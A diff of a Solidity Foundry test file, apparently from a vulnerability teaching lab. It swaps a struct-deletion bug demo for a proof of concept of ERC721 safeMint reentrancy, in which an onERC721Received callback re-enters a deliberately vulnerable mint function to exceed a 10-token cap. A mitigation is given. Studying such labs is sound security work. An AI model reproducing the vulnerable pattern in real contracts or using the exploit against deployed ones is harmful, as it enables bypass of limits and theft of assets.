@@ -2,114 +2,75 @@
 pragma solidity ^0.8.18;
 
 import "forge-std/Test.sol";
+import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
 
 /*
-Name: Struct Deletion Oversight
+Name: Unprotected callback - ERC721 SafeMint reentrancy
 
 Description:
-Incomplete struct deletion leaves residual data. 
-If you delete a struct containing a mapping, the mapping won't be deleted.
+The contract ContractTest is exploiting a callback feature to bypass the maximum mint limit 
+set by the MaxMint721 contract. This is achieved by triggering the onERC721Received function,
+which internally calls the mint function again. Therefore, although MaxMint721 attempts 
+to limit the number of tokens that a user can mint to MAX_PER_USER, the ContractTest contract 
+successfully mints more tokens than this limit. 
 
-The bug arises because Solidity's delete keyword does not reset the storage to its 
-initial state but rather performs a partial reset. 
-When delete  myStructs[structId] is called, 
-it only resets the id at mappingId to its default value 0, 
-but the other flags in the mapping remain unchanged. Therefore,
-if the struct is deleted without deleting the mapping inside, 
-the remaining flags will persist in storage.
+Scenario:
+This excersise is about a contract that via callback function to mint more NFTs
 
-Mitigation:  
-To fix this bug, you should delete the mapping inside the struct before deleting the struct itself.
+Mitigation:
+Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.
 
-REF:
-https://twitter.com/1nf0s3cpt/status/1676836264245592065
-https://docs.soliditylang.org/en/develop/types.html
+REF
+https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a
+https://www.paradigm.xyz/2021/08/the-dangers-of-surprising-code
+
 */
 
 contract ContractTest is Test {
-    StructDeletionBug StructDeletionBugContract;
-    FixedStructDeletion FixedStructDeletionContract;
+    MaxMint721 MaxMint721Contract;
+    bool complete;
+    uint256 maxMints = 10;
+    address alice = vm.addr(1);
+    address eve = vm.addr(2);
 
-    function setUp() public {
-        StructDeletionBugContract = new StructDeletionBug();
-        FixedStructDeletionContract = new FixedStructDeletion();
+    function testSafeMint() public {
+        MaxMint721Contract = new MaxMint721();
+        MaxMint721Contract.mint(maxMints);
+        console.log("Bypassed maxMints, we got 19 NFTs");
+        assertEq(MaxMint721Contract.balanceOf(address(this)), 19);
+        console.log("NFT minted:", MaxMint721Contract.balanceOf(address(this)));
     }
 
-    function testStructDeletion() public {
-        StructDeletionBugContract.addStruct(10, 10);
-        StructDeletionBugContract.getStruct(10, 10);
-        StructDeletionBugContract.deleteStruct(10);
-        StructDeletionBugContract.getStruct(10, 10);
-    }
-
-    function testFixedStructDeletion() public {
-        FixedStructDeletionContract.addStruct(10, 10);
-        FixedStructDeletionContract.getStruct(10, 10);
-        FixedStructDeletionContract.deleteStruct(10);
-        FixedStructDeletionContract.getStruct(10, 10);
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes memory
+    ) public returns (bytes4) {
+        if (!complete) {
+            complete = true;
+            MaxMint721Contract.mint(maxMints - 1);
+            console.log("Called with :", maxMints - 1);
+        }
+        return this.onERC721Received.selector;
     }
 
     receive() external payable {}
 }
 
-contract StructDeletionBug {
-    struct MyStruct {
-        uint256 id;
-        mapping(uint256 => bool) flags;
-    }
+contract MaxMint721 is ERC721Enumerable {
+    uint256 public MAX_PER_USER = 10;
 
-    mapping(uint256 => MyStruct) public myStructs;
+    constructor() ERC721("ERC721", "ERC721") {}
 
-    function addStruct(uint256 structId, uint256 flagKeys) public {
-        MyStruct storage newStruct = myStructs[structId];
-        newStruct.id = structId;
-        newStruct.flags[flagKeys] = true;
-    }
-
-    function getStruct(
-        uint256 structId,
-        uint256 flagKeys
-    ) public view returns (uint256, bool) {
-        MyStruct storage myStruct = myStructs[structId];
-        bool keys = myStruct.flags[flagKeys];
-        return (myStruct.id, keys);
-    }
-
-    function deleteStruct(uint256 structId) public {
-        MyStruct storage myStruct = myStructs[structId];
-        delete myStructs[structId];
-    }
-}
-
-contract FixedStructDeletion {
-    struct MyStruct {
-        uint256 id;
-        mapping(uint256 => bool) flags;
-    }
-
-    mapping(uint256 => MyStruct) public myStructs;
-
-    function addStruct(uint256 structId, uint256 flagKeys) public {
-        MyStruct storage newStruct = myStructs[structId];
-        newStruct.id = structId;
-        newStruct.flags[flagKeys] = true;
-    }
-
-    function getStruct(
-        uint256 structId,
-        uint256 flagKeys
-    ) public view returns (uint256, bool) {
-        MyStruct storage myStruct = myStructs[structId];
-        bool keys = myStruct.flags[flagKeys];
-        return (myStruct.id, keys);
-    }
-
-    function deleteStruct(uint256 structId) public {
-        MyStruct storage myStruct = myStructs[structId];
-        // Check if all flags are deleted, then delete the mapping
-        for (uint256 i = 0; i < 15; i++) {
-            delete myStruct.flags[i];
+    function mint(uint256 amount) external {
+        require(
+            balanceOf(msg.sender) + amount <= MAX_PER_USER,
+            "exceed max per user"
+        );
+        for (uint256 i = 0; i < amount; i++) {
+            uint256 mintIndex = totalSupply();
+            _safeMint(msg.sender, mintIndex);
         }
-        delete myStructs[structId];
     }
 }
